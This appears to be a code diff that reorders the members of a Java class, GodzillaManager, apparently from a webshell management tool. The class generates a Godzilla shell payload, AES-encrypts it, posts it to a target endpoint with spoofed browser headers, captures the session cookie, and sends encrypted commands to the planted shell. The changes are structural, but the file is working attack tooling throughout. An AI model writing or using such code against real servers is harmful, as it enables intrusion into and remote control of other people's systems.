@@ -29,8 +29,14 @@ import java.util.zip.GZIPOutputStream;
 @Getter
 @Setter
 public class GodzillaManager implements Closeable {
-    private final OkHttpClient client;
     private static final List<String> CLASS_NAMES;
+
+    static {
+        InputStream classNamesStream = Objects.requireNonNull(GodzillaGenerator.class.getResourceAsStream("/godzillaShellClassNames.txt"));
+        CLASS_NAMES = IOUtils.readLines(classNamesStream, "UTF-8");
+    }
+
+    private final OkHttpClient client;
     private String cookie = "";
     private String entrypoint;
     private String key;
@@ -39,9 +45,8 @@ public class GodzillaManager implements Closeable {
     private Request request;
     private Map<String, String> headers = new HashMap<>();
 
-    static {
-        InputStream classNamesStream = Objects.requireNonNull(GodzillaGenerator.class.getResourceAsStream("/godzillaShellClassNames.txt"));
-        CLASS_NAMES = IOUtils.readLines(classNamesStream, "UTF-8");
+    public GodzillaManager() {
+        this.client = new OkHttpClient.Builder().build();
     }
 
     public static Pair<String, String> getKeyMd5(String key, String pass) {
@@ -50,71 +55,8 @@ public class GodzillaManager implements Closeable {
         return Pair.of(md5Key, md5);
     }
 
-    public static class GodzillaManagerBuilder {
-        private String entrypoint;
-        private String key;
-        private String pass;
-        private final Map<String, String> headers = new HashMap<>();
-
-        public GodzillaManagerBuilder entrypoint(String entrypoint) {
-            this.entrypoint = entrypoint;
-            return this;
-        }
-
-        public GodzillaManagerBuilder key(String key) {
-            this.key = key;
-            return this;
-        }
-
-        public GodzillaManagerBuilder pass(String pass) {
-            this.pass = pass;
-            return this;
-        }
-
-        public GodzillaManagerBuilder header(String key, String value) {
-            this.headers.put(key, value);
-            return this;
-        }
-
-        public GodzillaManager build() {
-            GodzillaManager manager = new GodzillaManager();
-            manager.setEntrypoint(entrypoint);
-            manager.setPass(pass);
-            Pair<String, String> keyMd5 = getKeyMd5(key, pass);
-            manager.setKey(keyMd5.getLeft());
-            manager.setMd5(keyMd5.getRight());
-            Map<String, String> headers = new HashMap<>(16);
-            headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0");
-            headers.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
-            headers.put("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
-            headers.putAll(this.headers);
-            manager.setHeaders(headers);
-            return manager;
-        }
-    }
-
     public static GodzillaManagerBuilder builder() {
         return new GodzillaManagerBuilder();
-    }
-
-    public GodzillaManager() {
-        this.client = new OkHttpClient.Builder().build();
-    }
-
-    private Response post(byte[] bytes) throws IOException {
-        byte[] aes = aes(this.key, bytes, true);
-        String base64String = Base64.encodeBase64String(aes);
-        RequestBody requestBody = new FormBody.Builder()
-                .add(this.pass, base64String)
-                .build();
-        Request.Builder builder = new Request.Builder()
-                .url(this.entrypoint)
-                .post(requestBody)
-                .headers(Headers.of(this.headers));
-        if (StringUtils.isNotBlank(cookie)) {
-            builder.header("Cookie", cookie);
-        }
-        return client.newCall(builder.build()).execute();
     }
 
     @SneakyThrows
@@ -127,52 +69,6 @@ public class GodzillaManager implements Closeable {
                 .name(className)
                 .make()) {
             return make.getBytes();
-        }
-    }
-
-    public boolean start() {
-        byte[] bytes = generateGodzilla();
-        try (Response response = post(bytes)) {
-            String setCookie = response.header("Set-Cookie");
-            if (setCookie != null && setCookie.contains("JSESSIONID=")) {
-                cookie = setCookie.substring(setCookie.indexOf("JSESSIONID="), setCookie.indexOf(";"));
-            }
-            if (response.isSuccessful()) {
-                return true;
-            }
-            System.out.println(response.body().string());
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        return false;
-    }
-
-    public boolean test() {
-        byte[] bytes = generateMethodCallBytes("test");
-        try (Response response = post(bytes)) {
-            if (response.isSuccessful()) {
-                ResponseBody body = response.body();
-                if (body != null) {
-                    String resultFromRes = getResultFromRes(body.string(), this.key, this.md5);
-                    System.out.println(resultFromRes);
-                    return "ok".equals(resultFromRes);
-                }
-            }
-            return false;
-        } catch (IOException e) {
-            return false;
-        }
-    }
-
-    @Override
-    public void close() throws IOException {
-        byte[] bytes = generateMethodCallBytes("close");
-        try (Response response = post(bytes)) {
-            if (response.isSuccessful()) {
-                response.body();
-            }
-        } catch (IOException ignore) {
-
         }
     }
 
@@ -270,6 +166,72 @@ public class GodzillaManager implements Closeable {
         return (bytes[0] & 255) | ((bytes[1] & 255) << 8) | ((bytes[2] & 255) << 16) | ((bytes[3] & 255) << 24);
     }
 
+    public static byte[] intToBytes(int value) {
+        return new byte[]{(byte) (value & 255), (byte) ((value >> 8) & 255), (byte) ((value >> 16) & 255), (byte) ((value >> 24) & 255)};
+    }
+
+    private Response post(byte[] bytes) throws IOException {
+        byte[] aes = aes(this.key, bytes, true);
+        String base64String = Base64.encodeBase64String(aes);
+        RequestBody requestBody = new FormBody.Builder()
+                .add(this.pass, base64String)
+                .build();
+        Request.Builder builder = new Request.Builder()
+                .url(this.entrypoint)
+                .post(requestBody)
+                .headers(Headers.of(this.headers));
+        if (StringUtils.isNotBlank(cookie)) {
+            builder.header("Cookie", cookie);
+        }
+        return client.newCall(builder.build()).execute();
+    }
+
+    public boolean start() {
+        byte[] bytes = generateGodzilla();
+        try (Response response = post(bytes)) {
+            String setCookie = response.header("Set-Cookie");
+            if (setCookie != null && setCookie.contains("JSESSIONID=")) {
+                cookie = setCookie.substring(setCookie.indexOf("JSESSIONID="), setCookie.indexOf(";"));
+            }
+            if (response.isSuccessful()) {
+                return true;
+            }
+            System.out.println(response.body().string());
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return false;
+    }
+
+    public boolean test() {
+        byte[] bytes = generateMethodCallBytes("test");
+        try (Response response = post(bytes)) {
+            if (response.isSuccessful()) {
+                ResponseBody body = response.body();
+                if (body != null) {
+                    String resultFromRes = getResultFromRes(body.string(), this.key, this.md5);
+                    System.out.println(resultFromRes);
+                    return "ok".equals(resultFromRes);
+                }
+            }
+            return false;
+        } catch (IOException e) {
+            return false;
+        }
+    }
+
+    @Override
+    public void close() throws IOException {
+        byte[] bytes = generateMethodCallBytes("close");
+        try (Response response = post(bytes)) {
+            if (response.isSuccessful()) {
+                response.body();
+            }
+        } catch (IOException ignore) {
+
+        }
+    }
+
     @SneakyThrows
     private byte[] generateMethodCallBytes(String methodName) {
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
@@ -283,7 +245,46 @@ public class GodzillaManager implements Closeable {
         return byteArrayOutputStream.toByteArray();
     }
 
-    public static byte[] intToBytes(int value) {
-        return new byte[]{(byte) (value & 255), (byte) ((value >> 8) & 255), (byte) ((value >> 16) & 255), (byte) ((value >> 24) & 255)};
+    public static class GodzillaManagerBuilder {
+        private final Map<String, String> headers = new HashMap<>();
+        private String entrypoint;
+        private String key;
+        private String pass;
+
+        public GodzillaManagerBuilder entrypoint(String entrypoint) {
+            this.entrypoint = entrypoint;
+            return this;
+        }
+
+        public GodzillaManagerBuilder key(String key) {
+            this.key = key;
+            return this;
+        }
+
+        public GodzillaManagerBuilder pass(String pass) {
+            this.pass = pass;
+            return this;
+        }
+
+        public GodzillaManagerBuilder header(String key, String value) {
+            this.headers.put(key, value);
+            return this;
+        }
+
+        public GodzillaManager build() {
+            GodzillaManager manager = new GodzillaManager();
+            manager.setEntrypoint(entrypoint);
+            manager.setPass(pass);
+            Pair<String, String> keyMd5 = getKeyMd5(key, pass);
+            manager.setKey(keyMd5.getLeft());
+            manager.setMd5(keyMd5.getRight());
+            Map<String, String> headers = new HashMap<>(16);
+            headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0");
+            headers.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+            headers.put("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
+            headers.putAll(this.headers);
+            manager.setHeaders(headers);
+            return manager;
+        }
     }
 }
